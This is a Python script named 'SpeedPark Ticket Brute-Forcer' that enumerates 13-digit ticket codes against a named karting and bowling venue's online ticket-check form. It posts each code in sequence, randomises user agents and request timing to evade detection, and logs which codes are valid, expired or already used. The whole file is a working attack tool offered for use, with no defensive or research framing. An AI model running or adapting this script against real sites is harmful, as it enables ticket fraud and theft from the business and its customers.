#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, requests, random, time
from fake_useragent import UserAgent
from urllib.parse import urlencode
from bs4 import BeautifulSoup

from loading_bar import display_loading_bar

NUM_TICKET_START: int = 6220900600000
NUM_TICKET_MAX: int = (10**13) - 1
BAR_WIDTH: int = 30
DEFAULT_OUTPUT_FILE: str = None

parser = argparse.ArgumentParser(description='SpeedPark Ticket Brute-Forcer.')
parser.add_argument('-s', '--start', type=int, default=NUM_TICKET_START, help='Start number (default: %(default)s)')
parser.add_argument('-e', '--end', type=int, default=NUM_TICKET_MAX, help='End number (default: %(default)s)')
parser.add_argument('-n', '--number', type=int, default=NUM_TICKET_MAX, help='Number (default: %(default)s)')
parser.add_argument('-l', '--lengthbar', type=int, default=BAR_WIDTH, help='Length of the loading bar (default: %(default)s)')
parser.add_argument('-o', '--output', type=str, default=DEFAULT_OUTPUT_FILE, help='Output file for the results')
parser.add_argument('-v', '--version', action='version', version='SpeedPark-Ticket-Brute-Forcer 1.0', help='Show program\'s version number')
args = parser.parse_args()

NUM_TICKET_START = args.start
NUM_TICKET_MAX = args.end
BAR_WIDTH = args.lengthbar
OUTPUT_FILE = args.output

NUM_TICKET_VALIDE = 0
NUM_TICKET_PERIME = 0

ua = UserAgent()
random_user_agent = ua.random

url: str = 'https://www.kartingbowling.com/ce/index.php'
headers = {
    'User-Agent': random_user_agent,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.kartingbowling.com',
    'Connection': 'keep-alive',
    'Referer': 'https://www.kartingbowling.com/ce/index.php',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

data = {
    'code': f'{NUM_TICKET_START}',
    'btn': 'V%C3%A9rifier'
}

try:
    with requests.Session() as session:
        session.headers.update(headers)

        for n in range(NUM_TICKET_START, NUM_TICKET_MAX, 1):
            number = f'{n:013}'
            data['code'] = str(number)

            encoded_data = urlencode(data)
            response = session.post(url, headers=headers, data=encoded_data)

            soup = BeautifulSoup(response.content, 'html.parser')
            p_rep = soup.find('p', class_='rep')

            if p_rep:
                if not p_rep.text == "Tickets CE inexistant dans la base de données.":
                    if "périmé" in p_rep.text:
                        NUM_TICKET_PERIME += 1
                        print(f"\r[{data['code']}] - périmé depuis {p_rep.text.split('périmé depuis ')[1].split('.')[0]}" + " " * BAR_WIDTH)
                    if "utilisé" in p_rep.text:
                        NUM_TICKET_PERIME += 1
                        print(f"\r[{data['code']}] - utilisé le {p_rep.text.split('utilisé le ')[1].split('.')[0]}" + " " * BAR_WIDTH)
                    if "valide" in p_rep.text:
                        NUM_TICKET_VALIDE += 1
                        print(f"\r[{data['code']}] - {p_rep.text.split(' est ')[1]}" + " " * BAR_WIDTH)
            else:
                print(f"\r[{data['code']}] - Failed to parse response" + " " * BAR_WIDTH)

            display_loading_bar(NUM_TICKET_START, NUM_TICKET_MAX, int(number), BAR_WIDTH)
            time.sleep(random.uniform(0.2, 0.5))
except KeyboardInterrupt:
    print(f"\ntickets valides: {int(NUM_TICKET_VALIDE)}, tickets périmés: {str(NUM_TICKET_PERIME)}, tickets testés: {str(n - NUM_TICKET_START)}")
